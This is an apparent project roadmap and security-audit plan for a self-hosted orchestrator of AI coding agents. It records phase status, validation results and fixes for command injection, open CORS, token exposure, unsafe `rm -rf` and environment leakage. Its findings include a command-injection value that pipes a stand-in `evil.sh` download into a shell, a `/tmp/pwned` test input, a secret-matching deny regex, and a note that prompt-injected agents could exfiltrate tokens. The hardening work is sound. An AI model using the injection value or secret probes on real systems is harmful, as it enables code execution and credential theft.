@orc/engine` (86/86, 6 new), `npm test -w @orc/server` (62/62, 8 new)
green as of each merge. F42's shellcheck-clean + `--dry-run` verification
(a real EC2 box/Docker daemon weren't available in this environment) is
the one item whose *live* half is still owed — the owner should run it
for real during the actual EC2 deploy and confirm. Tagged `v0.5.0`.

### Phase 14 — Part 9: autonomy-hardening wave — ✅ DONE

| Item | Status | PR |
|---|---|---|
| B31 — deconstruction JSON parser breaks on inner code fences | ✅ done | [#125](https://github.com/IngeniousArtist/hoopedorc/pull/125) |
| F46 — planner output-shape hardening (flat DAG, validated, one retry) | ✅ done | [#125](https://github.com/IngeniousArtist/hoopedorc/pull/125) |
| F47 — scope-aware planning + author scope nudge | ✅ done | [#125](https://github.com/IngeniousArtist/hoopedorc/pull/125) |
| B32 — autonomous run silently ends on cooldown/quota block | ✅ done | [#127](https://github.com/IngeniousArtist/hoopedorc/pull/127) |
| S8 — non-bypassable destructive-change rail + safety prompts | ✅ done | [#129](https://github.com/IngeniousArtist/hoopedorc/pull/129) |
| B33 — no-changes diagnosis + a real opencode `--attach` cwd bug found & fixed | ✅ done | [#131](https://github.com/IngeniousArtist/hoopedorc/pull/131) |
| F44 — automode notification parity (model trouble + run-end in the web UI) | ✅ done | [#133](https://github.com/IngeniousArtist/hoopedorc/pull/133) |
| F45 — opencode-runner models as planner/deconstructor | ✅ done | [#135](https://github.com/IngeniousArtist/hoopedorc/pull/135) |

All seven items merged to `main` (B31+F46+F47 landed together in one PR,
per the plan's own suggested grouping — all three touch `planner.ts`);
`npm run typecheck`, `npm test -w @orc/engine`, `npm test -w @orc/server`,
`npm test -w @orc/adapters`, and `npm run build` green as of each merge
(112 engine / 92 server / 4 adapters tests by the end of the wave, up
from 90/83/4 at the start). Two items turned up confirmed, previously-
unknown bugs beyond what the plan anticipated, both live-verified
against real tooling rather than just reasoned about: B31's root cause
was reproduced byte-for-byte against the owner's exact reported error
text before being fixed; B33's investigation of the opencode `--attach`
hypothesis found a real cwd bug (traced to `PWD` having no effect on an
attached server's own process) via a live `opencode serve` +
`opencode run --attach` reproduction, fixed with the CLI's own `--dir`
flag, and the same fix was carried into F45's new planner path from the
start so it couldn't reintroduce the same class of bug. F45's live
verification ran the complete real pipeline — a real Claude Code
planning chat, a real opencode deconstruct call against real DeepSeek
credentials, and a real committed task DAG. B32's live acceptance line
(a tiny real quota surviving a real two-task run) and S8's live
acceptance line (a deliberately destructive task held for approval
under `fully_autonomous` via a full autonomous run) are the two items
whose fullest live form is still owed — both need the owner's real EC2
box/model credentials to exercise the complete pipeline end-to-end,
where this session's verification proved the same logic via real git
plumbing, real CLIs, and real (non-mocked) unit/integration tests
instead. Tagged `v0.6.0`.

**Post-wave validation follow-up (Fable review, 2026-07-14):** a full
re-verification of all eight items against their specs confirmed the
wave sound, and turned up two small gaps, both fixed in a follow-up PR:
(1) F46's drop paths (empty tasks in `parsePlanOutput`, non-object
entries in `flattenRawTasks`) shifted later tasks' `dependsOn` indices
without remapping them — a dependency declared past a dropped slot
could silently land on the wrong task (reproduced by probe); both drop
paths now remap through the shift the same way the subtask-splice
already did. (2) S8's `rm -rf` detection only matched combined flags —
split (`-r -f`) and long-form (`--recursive --force`) spellings evaded
it; replaced with a flag tokenizer covering all three spellings, same
target rules.

### Phase 15 — Part 10: reliability, portability, and mobile-control wave — ✅ DONE

| Item | Status | PR |
|---|---|---|
| B34 — execution ownership + unified manual queue | ✅ done, Fable-validated 2026-07-15 | [#139](https://github.com/IngeniousArtist/hoopedorc/pull/139) |
| B35 — managed subprocess lifecycle and cancellation | ✅ done, Fable-validated 2026-07-15 | [#140](https://github.com/IngeniousArtist/hoopedorc/pull/140) |
| S9 — fail-closed gates, destructive rail, and worktree hygiene | ✅ done, Fable-validated 2026-07-15 | [#141](https://github.com/IngeniousArtist/hoopedorc/pull/141) |
| B36 — rollback through a gated, human-approved PR | ✅ done, Fable-validated 2026-07-15 | [#142](https://github.com/IngeniousArtist/hoopedorc/pull/142) |
| S10 — CLI credential/environment boundary | ✅ done, Fable-validated 2026-07-15 | [#143](https://github.com/IngeniousArtist/hoopedorc/pull/143) |
| B37 — enabled models, live settings, and complete validation | ✅ done, Fable-validated 2026-07-15 | [#144](https://github.com/IngeniousArtist/hoopedorc/pull/144) |
| F48 — per-model effort setting across all model stages | ✅ done, Fable-validated 2026-07-15 | [#144](https://github.com/IngeniousArtist/hoopedorc/pull/144) |
| B38 — portable dependency setup and atomic caching | ✅ done, Fable-validated 2026-07-15 | [#145](https://github.com/IngeniousArtist/hoopedorc/pull/145) |
| B39 — planning and git durability | ✅ done, Fable-validated 2026-07-15 | [#146](https://github.com/IngeniousArtist/hoopedorc/pull/146) |
| B40 — complete model-invocation accounting | ✅ done, Fable-validated 2026-07-15 | [#148](https://github.com/IngeniousArtist/hoopedorc/pull/148) |
| B41 — graceful shutdown and runtime recovery | ✅ done, Fable-validated 2026-07-15 | [#149](https://github.com/IngeniousArtist/hoopedorc/pull/149) |
| F49 — Telegram reliability and phone-control hardening | ✅ Fable-validated 2026-07-15; owner live private-chat smoke passed 2026-07-23 | [#150](https://github.com/IngeniousArtist/hoopedorc/pull/150) |
| T2 — frontend unit/E2E test foundation | ✅ done, Fable-validated 2026-07-15 | [#151](https://github.com/IngeniousArtist/hoopedorc/pull/151) |
| U19 — full responsive UX pass | ✅ Fable-validated 2026-07-15; owner real-phone smoke passed 2026-07-23 | [#152](https://github.com/IngeniousArtist/hoopedorc/pull/152) |

The owner approved this wave on 2026-07-14. All implementation and independent
review evidence is recorded below. On 2026-07-23 the owner reported both
remaining deployment-only checks passed: the live Telegram private-chat smoke
and the real-phone smoke over the deployed Tailscale route. This closes Phase
15 without changing the already-merged implementation.

**Fable post-merge validation (2026-07-15), covering PRs #139–#146 (B34, B35,
S9, B36, S10, B37+F48, B38, B39):** all merged work re-verified independently
on `main` at c1d7eb2. `npm run typecheck` and `npm run build` pass; suites pass
at the claimed counts — 12/12 adapter, 157/157 engine, 127/127 server. Code
spot-checks confirmed each item's load-bearing claim in the merged source:
generation-tagged `ProjectRuntime` with settled-promise ownership, persisted
`dispatchRequestedAt`, and empty-scope-overlaps-everything (B34); managed
process groups with real-close SIGTERM→SIGKILL escalation and uniquely named
`docker rm -f` cleanup (B35); spawn/ENOENT failures fail gates, typed
`GitAcquisition` diff results, verified `restoreToHead` incl. nested untracked
repos, and forced approval on incomplete inspection (S9); parent-count-selected
revert with a mandatory-approval rollback PR and no direct default-branch push
(B36); allowlist-built child environments used by all three planner paths with
secret-shaped npm keys excluded (S10); one `normalizeSettings` contract and a
shared effort→`--effort`/`--variant`/`-c model_reasoning_effort` argument
builder (B37/F48); packageManager-first manager selection, frozen installs,
and mkdtemp+rename atomic cache publication (B38); planning scratch persisted
before the first await with Start blocked while `planning`, and `commitAll`
raising typed errors instead of swallowing them (B39).

One flake noted, not a blocker: server test "F44: a run ending non-completed
creates a web notification…" (`engine-runner.test.ts`) failed once under
full-suite load and passed 3/3 in isolation and on full-suite re-run —
timing-sensitive; worth tightening if it recurs under the now-landed T2 browser/unit
foundation. (It did not recur during the 2026-07-15 B40–U19 validation below.)

**Fable post-merge validation (2026-07-15), covering PRs #148–#152 (B40, B41,
F49, T2, U19):** all merged work re-verified independently on `main` at 4506dda.
`npm run typecheck`, `npm run build`, and `npm run lint` pass; every suite passes
at the claimed counts — 159/159 engine, 12/12 adapter, 159/159 server, 14/14 web
unit, and 14/14 Playwright e2e; GitHub CI is green on `main` for all five merge
commits. Code spot-checks confirmed each item's load-bearing claim in the merged
source: idempotent `INSERT OR IGNORE` invocation starts with a compare-and-set
terminal transition that shares one SQLite transaction with the legacy cost
projection, partial unique indexes preventing double-linked costs/model checks,
an idempotent boot migration that links exactly one legacy cost row per run and
interrupts orphaned `running` rows, ledger-derived quotas that count in-flight
calls, and cooldown/cost fan-out only on the first accepted terminal transition
(B40); an idempotent `ShutdownCoordinator` that attempts every cleanup step,
upgrades a graceful exit to code 1 on cleanup failure, closes admission
synchronously before its first await, refuses mutating HTTP requests with 503
during drain, one 15-second total engine deadline across all projects/rollbacks,
SQLite-persisted cooldowns, and 30-second-TTL Docker detection invalidated
immediately on failed docker executions (B41); private-chat + chat-id + sender-id
enforcement on both messages and callback queries, per-method request deadlines
with `retry_after`-aware bounded retry capped at 30s, bot-token redaction in
errors, chunked sends with reply markup only on the final chunk,
Markdown→plain-text approval retry, and permanent approval-delivery failure
fanned out to a web notification (F49); behavior-level unit assertions including
the failed-settings-save-stays-dirty contract, with CI running typecheck/build/
lint, all four workspace suites, and lockfile-pinned Chromium e2e (T2); and
element-level overflow diagnostics exempting only `data-horizontal-scroll`
regions, fixed/sticky-surface bounds checks, 40px touch targets scoped to
`max-width: 639px` so desktop density is untouched, safe-area offsets on
navigation/drawer/toasts/sticky save bar, reduced-motion support, and the drawer
Retry action relocated to Overview so a task failing before a PR opens is not
stranded (U19).

One nit, not a blocker: `@playwright/test` is `^1.61.1` in
`apps/web/package.json`, so the "pinned" browser claim holds through
`package-lock.json` (which `npm ci` honors) rather than an exact version.

**Owner live acceptance (reported 2026-07-23):** F49's Telegram private-chat
buttons/commands and U19's real-phone experience over the deployed Tailscale
route both passed. Those were the final two Phase 15 acceptance lines.

---

## Part 1 — Bugs & security (fix first, in this order)

### S1. Command injection via `execSync` string interpolation — CRITICAL — ✅ DONE (PR [#3](https://github.com/IngeniousArtist/hoopedorc/pull/3))

**Where:** `packages/engine/src/worktree-manager.ts` (7 call sites: lines ~40, 54, 69,
82, 87, 95, 213, 222, 240) and `packages/engine/src/validator.ts` (`getDiff`, ~line 107).

**Problem:** These build shell strings by interpolating `project.defaultBranch`,
`project.localPath`-derived paths, and branch names into `execSync("git … \"${x}\"")`.
`defaultBranch` and `localPath` are **user-controlled via the HTTP API**
(`POST /api/projects`, `PATCH /api/projects/:id`). Inside double quotes, `sh` still
performs `$(…)` command substitution, so a defaultBranch like
`main" $(curl evil.sh | sh) "` executes arbitrary commands. Combined with S2 (the API
is unauthenticated and CORS-open), this is a drive-by remote-command-execution vector.
Note `git-service.ts` already does this correctly with `execFile` + arg arrays — the
worktree manager and validator were never converted.

**Fix:**
1. Convert every `execSync` in `worktree-manager.ts` and `validator.ts` to
   `promisify(execFile)("git", [args…], { cwd })` — argument arrays, no shell. This
   also fixes the event-loop blocking (these sync calls freeze the server during
   fetch/worktree-add/diff; the codebase already migrated `git-service.ts` and
   `gate-runner.ts` for exactly this reason). `create()`, `remove()`, `changedFiles()`
   are already `async` so signatures don't change; `ValidatorImpl.getDiff` becomes
   async (await it in `review()`).
2. Belt-and-braces input validation in `packages/server/src/index.ts`:
   - `defaultBranch` must match `^[A-Za-z0-9._/-]+$` and must not start with `-`
     (reject with 400 otherwise) in both `POST /api/projects` and `PATCH`.
   - Reject any `repoUrl` that doesn't parse as `https://github.com/<owner>/<repo>`
     or `git@github.com:<owner>/<repo>` (it's passed to `gh --repo` and `git clone`;
     also prevents `-` flag-injection into git/gh).

**Acceptance:** grep shows zero `execSync(` under `packages/engine/`; creating a
project with `defaultBranch: 'main"; touch /tmp/pwned; "'` returns 400; typecheck,
build, engine tests green.

### S2. Unauthenticated API bound to 0.0.0.0 with reflect-any-origin CORS — CRITICAL — ✅ DONE (PR [#4](https://github.com/IngeniousArtist/hoopedorc/pull/4))

**Where:** `packages/server/src/index.ts` — `app.register(cors, { origin: true })`
(line ~243) and `app.listen({ port: ENV.port, host: "0.0.0.0" })` (line ~1290).

**Problem:** Anyone on the LAN — and, because CORS reflects every origin, **any
website open in the operator's browser** — can call every endpoint: read settings
(including the raw Telegram bot token, see S3), create/delete projects (which runs
`rm -rf` on disk, see S4), change merge policy to `fully_autonomous`, resolve
approvals, and start runs that spend real money and push code to GitHub. The
Tailscale-only deployment note in NEXT_STEPS doesn't protect a laptop on café wifi,
and CORS `origin: true` defeats even localhost-only binding.

**Fix (all three):**
1. **Bind host configurable, default loopback:** `ENV.host = process.env.HOST ?? "127.0.0.1"`
   in `config.ts`; use it in `app.listen`. Document `HOST=0.0.0.0` for tailnet/EC2 use.
2. **CORS allowlist:** default to the dev web origin(s)
   (`http://localhost:5173`, `http://127.0.0.1:5173`) plus an optional
   `ENV.corsOrigins` (comma-separated env `CORS_ORIGINS`). Never `origin: true`.
   (When the server later serves the built web app itself — F10 — same-origin makes
   CORS moot in production.)
3. **Optional bearer-token auth:** if `API_TOKEN` env (or a new
   `settings.apiToken`) is set, add a Fastify `onRequest` hook requiring
   `Authorization: Bearer <token>` on all `/api/*` routes except `/api/health`, and
   the same token as a `?token=` query param on the `/ws` upgrade. The web app reads
   the token from a login prompt stored in `localStorage` and sends it via
   `apps/web/src/api/client.ts` (add a header) and the `useWS` URL. Off by default
   (solo localhost use stays frictionless); required for any non-loopback HOST —
   refuse to start with `HOST != 127.0.0.1` unless a token is set or
   `ALLOW_UNAUTHENTICATED=1`.

**Acceptance:** server on defaults refuses connections from another machine; a fetch
from a random origin in the browser gets a CORS error; with `API_TOKEN` set, requests
without the header get 401, the web UI still works after entering the token.

### S3. Telegram bot token stored and served in plaintext — HIGH — ✅ DONE (PR [#5](https://github.com/IngeniousArtist/hoopedorc/pull/5))

**Where:** `settings.telegram.botToken` is saved raw in the settings JSON
(`repo.upsertSettings`) and returned verbatim by `GET /api/settings`; the Settings
page round-trips it (`apps/web/src/pages/Settings.tsx` lines ~470, 184). Whoever can
read the API (see S2) owns the bot — and the bot can approve risky merges.

**Fix:** Redact on read, write-only on save:
- In `GET /api/settings`, replace a present `botToken` with the literal
  `"__SET__"` sentinel (never the value).
- In `PUT /api/settings`, if the incoming `telegram.botToken` is `"__SET__"` or
  empty-and-previously-set, keep the stored value; otherwise overwrite.
- Settings UI: show a password field with placeholder "token saved — enter to
  replace", and stop echoing the token back into the input value.
- Same treatment for any future secret (`apiToken` from S2 item 3).
- Update the stale comment block at the top of `telegram.ts` (it still claims the
  token is "never stored raw" — it is, since the botToken field was added).

**Acceptance:** `curl /api/settings` never contains the real token; saving settings
without touching the token field leaves Telegram working; entering a new token
replaces it.

### S4. `rm -rf` on an arbitrary user-supplied path — HIGH — ✅ DONE (PR [#6](https://github.com/IngeniousArtist/hoopedorc/pull/6))

**Where:** `POST /api/projects` accepts `body.localPath` (any absolute path, `~`
expanded); `DELETE /api/projects/:id` then does
`rmSync(project.localPath, { recursive: true, force: true })` plus a sibling
`-wt-*` sweep (`index.ts` ~502–535). Creating a project with `localPath: "~"` and
deleting it wipes the home directory.

**Fix:**
1. On create: resolve and normalize the path; reject (400) if it is `/`, the home
   dir itself, not absolute after expansion, or contains `..`; reject if it is an
   ancestor of (or equal to) the server's CWD or `ENV.reposDir`. Require the path
   either not to exist yet or to be an empty directory or an existing clone whose
   `origin` matches `repoUrl` (a cheap `git remote get-url origin` check).
2. On delete: refuse the `rmSync` (skip cleanup, log a warning, still delete the DB
   rows) unless the directory contains a `.git` whose `origin` URL matches the
   project's `repoUrl`. Depth guard: also require `path.length > homedir().length + 1`.

**Acceptance:** creating a project with `localPath: "~"` or `"/"` returns 400;
deleting a project whose localPath was hand-edited to a non-clone directory leaves
the directory intact and logs a warning.

### S5. Spawned agents inherit the full server environment — MEDIUM

**Where:** both adapters (`packages/adapters/src/index.ts`) spawn `claude`/`opencode`
with `env: { ...process.env, PWD: opts.cwd }`; gate scripts (`gate-runner.ts`) and
`npm ci` (`worktree-manager.ts ensureDeps`) do the same. The server's env typically
holds `TELEGRAM_BOT_TOKEN` and any provider API keys from `.env` — and Claude runs
with `--permission-mode bypassPermissions`, so a prompt-injected or simply confused
agent (or any repo's `npm test` script — gates execute repo-controlled code by
design) can read and exfiltrate them.

**Fix:** build one `sanitizedEnv()` helper (new file `packages/adapters/src/env.ts`,
reused by engine via a copy or by passing env in `AgentRunOptions`): start from
`process.env`, delete keys matching
`/TOKEN|SECRET|KEY|PASSWORD|CREDENTIAL|TELEGRAM/i` except an allowlist the CLIs need
(`PATH`, `HOME`, `SHELL`, `TMPDIR`, `LANG`, `LC_*`, `NODE_*`, `npm_config_*`, plus
`ANTHROPIC_*` if present since Claude Code may need it). Use it for both adapters,
gate scripts, and `ensureDeps`. Document in README that gate scripts execute
repo-controlled code on the host, and that a container/sandbox mode is future work
(F13).

**Acceptance:** a task whose author prompt asks the model to `echo $TELEGRAM_BOT_TOKEN`
gets an empty value; agents and gates still run (verified by the seed-e2e harness).

### B1. "Stop" doesn't stop anything — the agent keeps running and spending — HIGH — ✅ DONE (PR [#8](https://github.com/IngeniousArtist/hoopedorc/pull/8))

**Where:** `POST /api/tasks/:id/stop` (`index.ts` ~906) only rewrites DB rows (run →
`stopped`, task → `blocked`). The actual child process lives in the Orchestrator's
`taskAbortControllers`, which the route never reaches. Worse, when the agent
finishes anyway, the pipeline continues (gates → validator → possibly **auto-merge**)
and overwrites the task status — the user pressed Stop and the PR merged anyway.

**Fix:**
1. `Orchestrator`: add `stopTask(taskId: string): boolean` — aborts the task's
   controller if present, marks the task id in a `stopRequested: Set<string>`, and
   `executeTask` checks that set at each stage boundary (after author run, after
   gates, before validator, before merge) and returns early with status `blocked`
   (emit a log line "stopped by user"). Clear the set entry in the `finally`.
2. `EngineRunner`: add `stopTask(projectId, taskId)` that forwards to the project's
   orchestrator (also look through the one-off orchestrators created by
   `dispatchOne` — see B3, which makes those tracked).
3. Route calls `engine.stopTask(...)` first; keep the DB writes as the fallback for
   when nothing is actually running. Also write an audit entry (`kind: "stopped"`,
   actor human).

**Acceptance:** dispatch a long task, hit Stop → the `claude`/`opencode` process is
gone within ~3s (SIGTERM→SIGKILL path already exists in `wireAbort`), the task ends
`blocked`, and nothing merges afterwards.

### B2. Run log history is unreadable after reload — every log row has `runId: ""` — HIGH — ✅ DONE (PR [#9](https://github.com/IngeniousArtist/hoopedorc/pull/9))

**Where:** every `onLog` emission in `orchestrator.ts` (lines ~522, 760, 811) and
`validator.ts` (~193) hardcodes `runId: ""`. The Board's history loader
(`Board.tsx` ~93–120) fetches runs, then `GET /api/runs/:id/logs` per run — which
matches nothing, so after a page reload the log panel is always empty; only live WS
logs ever show. The `runLogs` endpoint is effectively dead.

**Fix (choose the task-scoped route — simpler and matches how the UI thinks):**
1. Add `GET /api/tasks/:id/logs` (new `repo.getLogsByTask(db, taskId)`, indexed by
   the existing `task_id` column; add `LIMIT`/`?after=` paging — default last 1000).
   Register it in `ROUTES` in `@orc/types` and CONTRACT.md.
2. Board: replace the per-run log fan-out with one `taskLogs` call.
3. Keep writing `runId` properly anyway for future use: `executeTask` knows the
   attempt number, so pass `run-${task.id}-${task.attempts}` into the `onLog`
   payloads instead of `""` where a run exists (engine-level logs before the first
   attempt may keep `""`).

**Acceptance:** run a task, reload the page, select the task → historical logs appear.

### B3. Manual dispatch and the autonomous loop can double-run the same task — HIGH — ✅ DONE (PR [#10](https://github.com/IngeniousArtist/hoopedorc/pull/10))

**Where:** `EngineRunner.dispatchOne` builds a throwaway `Orchestrator` that is
**not** registered in `this.orchestrators`, so `engine.isRunning(projectId)` is
false while it runs. The `/dispatch` and `/retry` routes correctly refuse when the
autonomous loop is running — but the reverse is unguarded: pressing **Start** while
a manual dispatch is in flight boots the autonomous loop, whose orphan recovery sees
the task `in_progress` with no active run *in its own memory* and requeues it →
two agents on the same task, same branch name `orc/<taskId>`, same worktree path →
push rejections and interleaved commits.

**Fix:** track manual dispatches: keep a `Map<projectId, Set<taskId>> manualRuns` in
`EngineRunner`; `dispatchOne` registers/unregisters in a `finally`. `start()` returns
a 409-style error (throw; route surfaces it) if `manualRuns.get(project.id)?.size`.
Also expose the one-off orchestrator to `stopTask` (B1) via this map (store the
orchestrator instance, not just the task id).

**Acceptance:** while a manual dispatch runs, `POST /projects/:id/start` returns 409
with a clear message; after it finishes, start works.

### B4. Run rows are only written when a run *ends* — no live run, wrong duration — MEDIUM — ✅ DONE (PR [#11](https://github.com/IngeniousArtist/hoopedorc/pull/11))

**Where:** `Orchestrator.emitRunEvent` (orchestrator.ts ~820) is called once, after
the adapter returns, with `startedAt` = `endedAt` = now. So while an agent works
there is **no run row** (the `/dispatch` route papers over this with a fake
`placeholderRun` it never persists), run durations are always 0, and per-run cost
timing is wrong.

**Fix:** in `runAuthor`, emit a run event with `status: "running"`, real `startedAt`,
zero cost **before** `adapter.run(...)`; keep the terminal emit but preserve the
original `startedAt` (hold it in a local). `EngineRunner.onRunUpdated` already
upserts, so no server change is needed. Delete the `placeholderRun` blocks in
`/dispatch` and `/retry` and return the real run row (`repo.getRuns` after dispatch)
or just `{ task }` — update `@orc/types` responses accordingly and the two callers in
the web app.

**Acceptance:** during a run, `GET /api/tasks/:id/runs` shows a `running` row;
after completion the row's `endedAt - startedAt` matches wall-clock (>0).

### B5. `PATCH /api/tasks/:id` accepts any string as `status` — MEDIUM — ✅ DONE (PR [#12](https://github.com/IngeniousArtist/hoopedorc/pull/12))

**Where:** `index.ts` ~793: `if (body.status) updates.status = body.status` — no
validation against `TaskStatus`, no guard against nonsensical transitions (e.g.
setting a `done` task back to `in_progress` by hand, which orphan recovery will then
requeue and re-run, re-opening merged work).

**Fix:** validate `body.status` against the `TaskStatus` union (export a
`TASK_STATUSES` const array from `@orc/types/domain.ts` and reuse it in the Board's
column list too). Allow only human-meaningful transitions: anything →
`backlog`/`ready` (requeue), `in_progress` → nothing (409 — use Stop), `done` →
nothing (409 — use Rollback/Retry). Return 400 with the allowed set otherwise. Apply
the same enum check to `difficulty`/`role` if you add them to the PATCH body later.

**Acceptance:** `PATCH {status: "bogus"}` → 400; `PATCH {status: "ready"}` on a
failed task works; `PATCH {status: "in_progress"}` → 409.

### B6. `in_review` status exists but is never set — dead kanban column — LOW — ✅ DONE (PR [#14](https://github.com/IngeniousArtist/hoopedorc/pull/14))

**Where:** `domain.ts` defines `in_review` ("gates + validator running"); the
orchestrator never assigns it, so the Board column is permanently empty and the
user can't see which tasks are being validated (a phase that takes minutes).

**Fix:** in `executeTask`, set `task.status = "in_review"` +
`onTaskUpdated` right before the gates run, and back to `in_progress` when a retry
loop iterates (fix instructions path). Orphan recovery (`start()`) must treat
`in_review` like `in_progress` (requeue). `estimate.ts` already counts `in_review`
as pending — good. Check the Stop path (B1) handles `in_review` too.

**Acceptance:** while gates/validator run, the card sits in "In Review"; on a
gate-failure retry it moves back to "In Progress".

### B7. Planner passes the whole conversation as one argv — will hit E2BIG — MEDIUM

**Where:** `planner.ts runClaudeJson` spawns `claude -p <prompt>` with the full chat
transcript + prior-context inlined in a single argument; adapters do the same with
task prompts. macOS caps a single arg ~256KB and total argv ~1MB — a long planning
chat on a project with a fat PRD will start failing with a cryptic spawn error.

**Fix:** write the prompt to stdin instead: `claude -p --output-format json` reads
the prompt from stdin when `-p` is given no value (verify with `claude --help`; if
stdin isn't supported for `-p`, write the prompt to a temp file inside the cwd and
pass `-p "$(instructions to read file)"` — prefer stdin: change
`stdio: ["ignore", …]` to `["pipe", …]` and `proc.stdin.end(prompt)`). Do the same
for both adapters in `packages/adapters/src/index.ts` (`claude` and `opencode run`
both accept the prompt on stdin; for opencode, keep the message as the last CLI arg
only if stdin proves unsupported). Trim `buildPriorContext` task lists to the most
recent ~50 tasks as an extra bound.

**Acceptance:** a planning chat with a 300KB transcript completes; adapters still
pass the existing engine tests and the seed-e2e harness runs.

### B8. Telegram messages with Markdown metacharacters silently fail — LOW — ✅ DONE (PR [#15](https://github.com/IngeniousArtist/hoopedorc/pull/15))

**Where:** `telegram.ts approvalRequested` sends `parse_mode: "Markdown"` with raw
task titles/messages. A title containing `_`, `*`, `[`, or a backtick makes the Bot
API reject the message → the approval never reaches the phone (the code logs and
moves on) → an unattended run stalls waiting for an approval the user never saw.

**Fix:** drop `parse_mode` entirely (plain text is fine for these) or escape
Telegram-Markdown metacharacters. Also have `approvalRequested` fall back to a
plain-text resend (no parse_mode) if the first send returns `ok: false` — `tg()`
currently swallows the error; make it return the error description so callers can
retry.

**Acceptance:** an approval whose title is `fix _foo_ [bar]` arrives on Telegram.

### B9. Tasks added mid-run are invisible to the running orchestrator — MEDIUM

**Where:** `Orchestrator.start` loads `tasks` once and loops over that array;
`plan/commit` on a running project writes new Task rows the loop never sees, and the
run "finishes" without them (they sit in `backlog` until the user manually presses
Start again — which currently they can, since the finished loop deregisters).

**Fix:** give the loop a refresh hook: add `getTasks?: () => Task[]` to
`SchedulerDeps` (`EngineRunner` supplies `() => repo.getTasks(db, project.id)`).
At the top of each `while` iteration, reconcile: append any DB task whose id isn't
in `currentTasks` (and adopt status changes for non-active tasks, replacing the
per-task `fresh` patch that exists today). Keep in-memory state authoritative for
tasks in `activeTaskIds`. This is also the foundation for the "add a task while it
runs" product feature (F3).

**Acceptance:** start a 2-task project, `plan/commit` a third task while the first
runs → the third dispatches without restarting the run.

### B10. Stale unresolved approvals survive restarts as zombie action-required items — LOW

**Where:** `EngineRunner.pendingApprovals` resolvers live in process memory. After a
restart, resume-on-boot re-runs tasks and creates **new** notifications, but the old
`requiresApproval` rows (with no `respondedWith`) remain; the Notifications page and
Telegram show dead Approve/Reject buttons whose `resolveApproval` returns false.

**Fix:** on boot (in `main()` before resume), mark all unresponded
approval-notifications as `respondedWith: "expired_restart"` (new repo helper,
one UPDATE), and have the UI render that as "expired". When
`resolveNotification` can't find a resolver, return an explicit "approval expired —
the task will re-request if still needed" message to the caller (HTTP 410 / Telegram
callback answer) instead of silently succeeding.

**Acceptance:** kill the server while an approval is pending; after restart the old
notification shows "expired" and responding to it returns the explicit message.

### B11. Gates pass vacuously on repos with no scripts — MEDIUM (safety rail gap)

**Where:** `gate-runner.ts runScript` uses `npm run <s> --if-present`, so a repo
with no `typecheck`/`lint`/`build`/`test` scripts passes every gate (exit 0). New
repos created by `createGithubRepo` are seeded with a script-less `package.json` —
i.e. **the default path for brand-new projects has zero objective gates**; only the
validator model stands between generated code and auto-merge.

**Fix (two parts):**
1. Surface it: `GateRunnerImpl.run` already returns per-gate `output` saying
   "unavailable" — add a `vacuous: boolean` to `GateResult.details` (types change)
   when *all four* script gates were missing, and have `canAutoMerge` treat a fully
   vacuous gate result as risky (escalate to approval) unless a new
   `settings.allowVacuousGates` (default false) is on. Show a warning banner on the
   Board when the last gate result was vacuous.
2. Fix the root for new repos: when the planner deconstructs a plan for a brand-new
   repo, the seeded scaffold task should add real `test`/`build` scripts — append a
   standing instruction to `DECONSTRUCT_SHAPE` in `planner.ts`: the first scaffold
   task must set up `package.json` scripts (`test`, `build`, `lint`, `typecheck`)
   appropriate to the stack it chooses, and its acceptance criteria must include
   "npm test runs real tests and passes".

**Acceptance:** a repo with no scripts + `hard_gate_flag_risky` policy → merge
requires approval with reason "no objective gates ran"; engine tests green.

### B12. Risky-file regex flags `author.ts`, `token.ts` etc. — LOW (noise) — ✅ DONE (PR [#16](https://github.com/IngeniousArtist/hoopedorc/pull/16))

**Where:** `orchestrator.ts canAutoMerge`:
`/\.env|auth|secret|credential|token/i.test(f)` matches substrings anywhere in the
path — `src/author.ts`, `docs/authors.md`, `tokenizer.ts` all trip the
"auth/secret change" rail and needlessly demote auto-merges to approvals (alert
fatigue → the user stops reading approvals).

**Fix:** match path *segments*, not substrings:
`/(^|\/)\.env(\.|$)|(^|\/)(auth|secrets?|credentials?|tokens?)(\/|\.|$)/i` — and add
unit tests in the engine test file for `author.ts` (no), `auth.ts` (yes),
`src/auth/login.ts` (yes), `tokenizer.ts` (no), `.env.local` (yes).

**Acceptance:** new unit tests pass; the four existing engine tests stay green.

### B13. `scopesOverlap` mishandles glob patterns — LOW — ✅ DONE (PR [#17](https://github.com/IngeniousArtist/hoopedorc/pull/17))

**Where:** `orchestrator.ts scopesOverlap` only strips a trailing `/**`; patterns
like `src/**/*.ts`, `**/*`, `*.md` fall through to literal string compares, so
tasks scoped `["**/*"]` (the planner's fallback and the stub tasks) are treated as
never overlapping anything — the serialization rail silently off for exactly the
least-scoped (riskiest) tasks.

**Fix:** normalize each pattern to its static prefix (everything before the first
glob char: `src/**/*.ts` → `src`, `**/*` → `""`), then apply the existing
prefix-overlap logic, where an empty prefix overlaps everything. Add engine unit
tests: `["**/*"]` vs anything → true; `["src/**/*.ts"]` vs `["src/utils/**"]` →
true; `["docs/**"]` vs `["src/**"]` → false.

**Acceptance:** new tests pass; a plan with two `**/*` tasks runs them serially.

### B14. Unbounded `logs` table growth — LOW — ✅ DONE (PR [#18](https://github.com/IngeniousArtist/hoopedorc/pull/18))

**Where:** every agent output line is persisted forever (`logs` table); a few long
runs → hundreds of MB in SQLite, slowing the WAL and snapshot queries.

**Fix:** prune on boot and daily (`setInterval` in `main()`): delete logs older
than `LOG_RETENTION_DAYS` (env, default 14) **and** keep at most the newest ~2000
rows per task (`DELETE FROM logs WHERE task_id = ? AND id NOT IN (SELECT id … ORDER
BY ts DESC LIMIT 2000)` per task with more). Add an index on `logs(task_id, ts)` in
`schema.sql` (B2 relies on it too).

**Acceptance:** boot with an old fat DB → row count drops; task log view (B2) still
shows recent history.

### B15. WS broadcasts every project's events to every client — LOW

**Where:** `ws-hub.ts broadcast` ignores `client.projectId`; subscription only
scopes the snapshot. With several projects running, every browser tab processes
every log line of every project (the Board filters client-side by taskId, so it's
waste + a subtle cross-project log-bleed in the LogPanel if task ids ever collide).

**Fix:** carry a `projectId` on `ServerEvent` payloads where missing (log events
need one — thread it through `EngineRunner.enqueueLog`; task/run/project events
already imply it) and have `broadcast` skip clients subscribed to a different
project (clients with no subscription get project-level events only:
`project.updated/deleted`). Keep `notification` events global (they're the "needs
you" channel).

**Acceptance:** two projects running, two tabs each subscribed to one → each tab's
WS frames only contain its own project's logs.

---

## Part 2 — Productization features (build after Part 1)

Vision reminder (from the user): not a SaaS — a robust self-hosted app for
developers who, like the owner, hold several model subscriptions and want to run a
